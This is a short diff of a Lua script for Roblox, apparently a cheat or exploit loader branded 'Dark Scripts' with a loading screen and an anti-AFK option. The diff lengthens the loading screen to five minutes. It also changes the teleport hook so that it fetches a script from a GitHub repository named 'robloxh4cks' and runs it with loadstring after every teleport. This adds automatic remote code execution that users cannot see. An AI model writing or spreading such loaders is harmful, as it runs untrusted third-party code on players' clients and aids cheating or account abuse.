@@ -3,7 +3,7 @@
 
 -- ========== CONFIG ==========
 local Anti_Afk = true
-local Loading_Duration = 10 -- 5 minutes in seconds
+local Loading_Duration = 300 -- 5 minutes in seconds
 local Loading_Title = "🌴 Dark Scripts 🌴" -- Main title text
 -- ===========================
 
@@ -16,7 +16,7 @@ local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
 if queue_on_teleport then
-    queue_on_teleport(game:HttpGet('https://raw.githubusercontent.com/robloxh4cks/load/refs/heads/main/public.lua'))
+    queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/robloxh4cks/load/refs/heads/main/public.lua"))()')
 end
 
 -- Anti-AFK System
